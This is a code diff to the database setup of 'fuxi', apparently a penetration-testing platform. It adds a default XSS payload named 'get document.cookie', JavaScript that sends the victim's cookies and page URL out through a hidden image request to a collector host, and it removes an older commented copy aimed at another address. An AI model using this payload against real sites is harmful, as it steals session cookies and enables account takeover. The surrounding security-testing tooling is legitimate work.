@@ -10,8 +10,9 @@ import sys
 from fuxi.common.utils.logger import logger
 from sqlalchemy.exc import OperationalError
 from fuxi.common.utils.poc_handler import poc_parser
-from fuxi.core.databases.orm.user import DBFuxiAdmin
-from fuxi.core.databases.orm.pocsuite import DBPocsuitePlugin
+from fuxi.core.databases.orm.auth.user_orm import DBFuxiAdmin
+from fuxi.core.databases.orm.scanner.pocsuite_orm import DBPocsuitePlugin
+from fuxi.core.databases.orm.exploit.xss_orm import DBXssPayloads
 
 
 def databases_init():
@@ -38,14 +39,15 @@ def databases_init():
     except Exception as e:
         logger.error("database initialization failure: {}".format(e))
         sys.exit(0)
-    #
-    # if not MongoDB(T_XSS_PAYLOADS).find_one():
-    #     MongoDB(T_XSS_PAYLOADS).insert_one({
-    #         "name": "document.cookie",
-    #         "value": "var url = document.location.href\nvar data = 'cookie=' + encodeURIComponent("
-    #                  "document.cookie)\nvar img = document.createElement('img');\nimg.width = 0;\nimg.height = "
-    #                  "0;\nvar api = 'http://192.168.199.147:50010/xss';\nimg.src = "
-    #                  "api+'?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);\n",
-    #         "date": "2019-01-01 23:59:59"
-    #     })
-    #
+
+    if not DBXssPayloads.find_one():
+        name = "get document.cookie"
+        value = "var api = 'http://127.0.0.1:50020';\n" \
+                "var url = document.location.href;\n" \
+                "var salt = 'abcde';\n" \
+                "var data = 'cookie=' + encodeURIComponent(document.cookie);\n" \
+                "var img = document.createElement('img');\n" \
+                "img.width = 0; img.height = 0;\n" \
+                "img.src = api+'/xss?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);"
+        DBXssPayloads.add(name, value)
+
